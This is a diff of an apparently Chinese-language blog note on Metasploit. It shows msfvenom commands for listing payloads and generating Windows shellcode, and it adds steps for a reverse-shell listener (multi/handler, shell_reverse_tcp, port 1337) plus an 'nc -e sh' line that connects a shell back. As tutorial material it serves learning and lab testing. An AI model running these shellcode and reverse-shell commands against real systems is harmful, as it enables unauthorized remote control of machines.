@@ -51,7 +51,9 @@ if (!doNotTrack) {
 <div id="content"><div class="date"> 
         <time datetime="2019-09-10 10:26:29 &#43;0800 CST">Tue, 2019 Sep 10</time>
     </div> 
-    <h2 id="產生shellcode">產生shellcode</h2>
+    <p>查詢審查過的模塊</p>
+<p><a href="https://www.rapid7.com/db/?type=metasploit">Vulnerability &amp; Exploit Database</a></p>
+<h2 id="產生shellcode">產生shellcode</h2>
 <p>顯示payload列表</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -l payload 
 </code></pre></div><p>生成shellcode</p>
@@ -62,6 +64,23 @@ if (!doNotTrack) {
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/x64/exec CMD<span style="color:#f92672">=</span>calc.exe -f python -b <span style="color:#e6db74">&#39;\x00\x0a\x0d&#39;</span>
 </code></pre></div><h3 id="注意">注意</h3>
 <p>如果在操作nc時，nc也可能受到<code>\x00</code>、<code>\x0a</code>、<code>\x0d</code>的影響。</p>
+<h2 id="建立反向shell">建立反向shell</h2>
+<p>透過msf的內建session監聽，<code>-q</code>僅用來不打印初始圖像</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -q   
+</code></pre></div><p>配置使用模塊</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">use exploit/multi/handler
+set payload generic/shell_reverse_tcp
+</code></pre></div><p>配置反向shell使用端口與地址</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">set lhost 0.0.0.0
+set lport 1337
+run
+</code></pre></div><p>啟動nc進行連結</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 127.0.0.1 <span style="color:#ae81ff">1337</span> -e sh  
+</code></pre></div><h3 id="參見">參見</h3>
+<ul>
+<li><a href="https://metasploit.help.rapid7.com/docs/working-with-payloads">Working with Payloads</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit">How to use a reverse shell in Metasploit</a></li>
+</ul>
 
     
       <hr>
